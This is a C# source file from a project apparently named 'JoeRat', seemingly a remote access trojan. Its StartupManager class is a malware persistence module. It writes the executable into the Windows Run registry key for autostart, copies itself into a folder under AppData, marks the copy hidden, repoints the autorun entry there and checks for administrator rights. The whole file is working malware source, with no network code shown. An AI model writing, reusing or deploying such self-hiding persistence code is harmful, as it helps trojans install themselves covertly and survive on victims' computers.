using System;
using System.IO;
using System.Security.Principal;
using Microsoft.Win32;

namespace JoeRat
{
    public static class StartupManager
    {
        private static string AppName => Path.GetFileNameWithoutExtension(GetExecutablePath());
        private const string StartupRegPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

        public static bool IsInStartup()
        {
            try
            {
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(StartupRegPath))
                {
                    if (key == null) return false;
                    
                    var value = key.GetValue(AppName);
                    return value != null && value.ToString() == GetExecutablePath();
                }
            }
            catch (Exception ex)
            {
                ExitForm.Log($"Error checking startup status: {ex.Message}");
                return false;
            }
        }

        public static bool AddToStartup()
        {
            try
            {
                string executablePath = GetExecutablePath();
                
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(StartupRegPath, true))
                {
                    if (key == null) return false;
                    
                    key.SetValue(AppName, executablePath);
                    ExitForm.Log($"Added to startup: {executablePath}");
                    return true;
                }
            }
            catch (Exception ex)
            {
                ExitForm.Log($"Error adding to startup: {ex.Message}");
                return false;
            }
        }

        public static bool RemoveFromStartup()
        {
            try
            {
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(StartupRegPath, true))
                {
                    if (key == null) return false;
                    
                    if (key.GetValue(AppName) != null)
                    {
                        key.DeleteValue(AppName, false);
                        ExitForm.Log("Removed from startup");
                    }
                    return true;
                }
            }
            catch (Exception ex)
            {
                ExitForm.Log($"Error removing from startup: {ex.Message}");
                return false;
            }
        }

        private static string GetExecutablePath()
        {
            // Get the actual executable path, not the assembly location
            return Environment.ProcessPath ?? System.Reflection.Assembly.GetExecutingAssembly().Location.Replace(".dll", ".exe");
        }

        public static bool IsInAppData()
        {
            try
            {
                string currentPath = GetExecutablePath();
                string appDataPath = GetAppDataPath();
                return currentPath.StartsWith(appDataPath, StringComparison.OrdinalIgnoreCase);
            }
            catch
            {
                return false;
            }
        }

        public static string GetAppDataPath()
        {
            string appDataFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), AppName);
            Directory.CreateDirectory(appDataFolder);
            return appDataFolder;
        }

        public static bool MoveToAppData()
        {
            try
            {
                string currentPath = GetExecutablePath();
                string appDataFolder = GetAppDataPath();
                string targetPath = Path.Combine(appDataFolder, $"{AppName}.exe");

                // Check if already in AppData
                if (currentPath.Equals(targetPath, StringComparison.OrdinalIgnoreCase))
                {
                    ExitForm.Log("Already in AppData location");
                    return true;
                }

                // Check if target already exists
                if (File.Exists(targetPath))
                {
                    ExitForm.Log("Target file already exists in AppData");
                    return false;
                }

                // Copy to AppData
                File.Copy(currentPath, targetPath, false);
                
                // Make hidden
                File.SetAttributes(targetPath, FileAttributes.Hidden);

                // Update startup registry to point to new location
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(StartupRegPath, true))
                {
                    if (key != null)
                    {
                        key.SetValue(AppName, targetPath);
                        ExitForm.Log($"Updated startup path to: {targetPath}");
                    }
                }

                ExitForm.Log($"Moved to AppData: {targetPath}");
                return true;
            }
            catch (Exception ex)
            {
                ExitForm.Log($"Error moving to AppData: {ex.Message}");
                return false;
            }
        }

        public static bool IsAdministrator()
        {
            try
            {
                var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }
    }
}
